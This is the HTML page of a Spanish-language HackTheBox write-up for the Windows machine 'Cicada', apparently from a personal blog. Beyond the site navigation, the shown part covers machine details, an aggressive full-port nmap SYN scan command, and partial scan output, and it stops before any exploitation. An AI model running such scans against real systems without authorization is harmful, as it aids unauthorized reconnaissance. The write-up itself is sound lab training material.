@@ -1,0 +1,1569 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../lame/">
+      
+      
+        <link rel="next" href="../../challenges/pwn/r0bob1rd/">
+      
+      
+      <link rel="icon" href="../../../../img/kzf-logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.13">
+    
+    
+      
+        <title>Cicada - KrozFu</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Cicada - KrozFu" >
+      
+        <meta  property="og:description"  content="None" >
+      
+        <meta  property="og:image"  content="./assets/images/social/writeups/hackthebox/machines/cicada.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="None" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Cicada - KrozFu" >
+      
+        <meta  name="twitter:description"  content="None" >
+      
+        <meta  name="twitter:image"  content="./assets/images/social/writeups/hackthebox/machines/cicada.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#informacion-maquina" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="KrozFu" class="md-header__button md-logo" aria-label="KrozFu" data-md-component="logo">
+      
+  <img src="../../../../img/kzf-logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            KrozFu
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cicada
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="lime"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Whoami
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../articles/nat-attack-hping/" class="md-tabs__link">
+          
+  
+  
+  Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../blue/" class="md-tabs__link">
+          
+  
+  
+  Writeups
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="KrozFu" class="md-nav__button md-logo" aria-label="KrozFu" data-md-component="logo">
+      
+  <img src="../../../../img/kzf-logo.png" alt="logo">
+
+    </a>
+    KrozFu
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Whoami
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Projects
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Projects
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/nat-attack-hping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Configuración NAT y ataque con hping MikroTik
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/wireguard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Implementación WireGuard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/servidor-ubuntu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Implementación Servidores
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/kali-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Instalar Kali Linux VMware
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Machines
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blue
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lame/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lame
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Cicada
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cicada
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacion-maquina" class="md-nav__link">
+    <span class="md-ellipsis">
+      Información maquina
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#requisitos-previos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Requisitos previos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconocimiento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconocimiento
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalamiento-de-privilegios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escalamiento de privilegios
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Challenges
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_1" id="__nav_3_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pwn
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pwn
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/pwn/r0bob1rd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    R0bob1rd
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_2" id="__nav_3_1_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Coding
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Coding
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/coding/primed-for-action/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Primed-for-Action
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_3" id="__nav_3_1_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Hardware
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Hardware
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/hardware/the-needle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    The-Needle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            TryHackMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tryhackme/pickle-rick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Cicada</h1>
+
+<h2 id="informacion-maquina">Información maquina</h2>
+<p><img alt="img" src="../img/cicada/cicada.png" /></p>
+<table>
+<thead>
+<tr>
+<th><strong>Parámetros</strong></th>
+<th><strong>Características</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Windows</td>
+</tr>
+<tr>
+<td>Dificultad</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Creador</td>
+<td>theblxckcicada</td>
+</tr>
+<tr>
+<td>Link</td>
+<td><a href="https://www.hackthebox.com/machines/cicada">Cicada</a></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Tema contemplados</strong></p>
+<blockquote>
+<p>Enumeración y reconocimiento con <code>nmap</code>.<br />
+Enumeración de entornos de directorio.<br />
+Ingeniería inversa, criptografía.<br />
+Reconocimiento de servicios de una maquina Windows.  </p>
+</blockquote>
+<h2 id="requisitos-previos">Requisitos previos</h2>
+<p>Para mantener una mayor facilidad a la hora de realizar un reconocimiento de la maquina vulnerable vamos a realizar la exportación de la IP a una variable para poder hacer mas manejable este paso.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">export</span><span class="w"> </span><span class="n">ip</span><span class="o">=</span><span class="s2">&quot;10.10.11.35&quot;</span>
+</code></pre></div>
+<p>Se realiza una prueba de conectividad lanzando una traza de ICMP al host, con lo que se comprueba que es una maquina Windows por el <code>TTL</code> que esta por el rango de 128.</p>
+<p><img alt="img" src="../img/cicada/img1.png" /></p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Se realiza el primer reconocimiento con <code>nmap</code>, para obtener la diferente información de los puertos que tenga abiertos.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="o">-</span><span class="w"> </span><span class="o">--</span><span class="nb">open</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="no">Pn</span><span class="w"> </span><span class="o">-</span><span class="n">sS</span><span class="w"> </span><span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span><span class="o">=</span><span class="mi">5000</span><span class="w"> </span><span class="o">-</span><span class="n">vvv</span><span class="w"> </span><span class="vg">$ip</span><span class="w"> </span><span class="o">-</span><span class="n">oN</span><span class="w"> </span><span class="n">preScan</span>
+</code></pre></div>
+<p>Resultados después del reconocimiento de puertos con <code>nmap</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="no">Nmap</span><span class="w"> </span><span class="nb">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="no">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">user</span><span class="o">-</span><span class="n">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">13</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="no">Scanned</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">26</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">42</span><span class="w"> </span><span class="o">-</span><span class="mo">05</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">27</span><span class="n">s</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="no">Not</span><span class="w"> </span><span class="ss">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65523</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="no">Some</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">reported</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">filtered</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="no">PORT</span><span class="w">      </span><span class="no">STATE</span><span class="w"> </span><span class="no">SERVICE</span><span class="w">          </span><span class="no">REASON</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="nb">open</span><span class="w">  </span><span class="n">domain</span><span class="w">           </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="nb">open</span><span class="w">  </span><span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span><span class="w">     </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">            </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">      </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="nb">open</span><span class="w">  </span><span class="n">ldap</span><span class="w">             </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">127</span>
